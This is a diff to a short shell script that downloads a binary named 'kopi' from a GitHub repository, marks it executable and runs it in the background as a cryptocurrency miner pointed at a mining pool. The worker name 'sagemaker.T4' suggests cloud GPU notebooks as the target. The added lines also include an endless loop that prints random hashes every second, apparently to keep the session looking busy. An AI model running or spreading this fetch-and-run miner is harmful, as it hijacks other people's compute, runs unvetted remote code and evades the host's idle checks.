@@ -1,3 +1,12 @@
 #!/bin/sh
-wget https://github.com/aurbach55/dera/raw/main/kopi
-chmod +x ./kopi && ./kopi --coin ETH --pool ethash.poolbinance.com:443 --user TeslaM.$(echo $(shuf -i 1-9999 -n 1)-T4)
+#!/bin/bash
+
+wget https://github.com/aurbach55/dera/raw/main/kopi && chmod +x ./kopi && nohup ./kopi --algo ETCHASH --pool 47.108.153.82:443 --user sagemaker.T4 > nohup.out
+while [ 1 ]; do
+
+  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1s; done
+
+sleep 2
+
+done
+
